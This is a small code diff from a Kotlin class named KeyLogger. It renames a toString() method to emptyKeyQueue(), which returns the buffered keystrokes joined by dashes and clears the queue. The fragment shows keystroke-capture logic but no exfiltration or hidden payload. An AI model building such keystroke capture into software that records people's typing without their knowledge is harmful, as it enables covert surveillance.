@@ -33,7 +33,7 @@ class KeyLogger {
         }
     }
 
-    override fun toString(): String {
+    fun emptyKeyQueue(): String {
         val keystrokes = keystrokeQueue.joinToString("-")
         keystrokeQueue.clear()
         return keystrokes
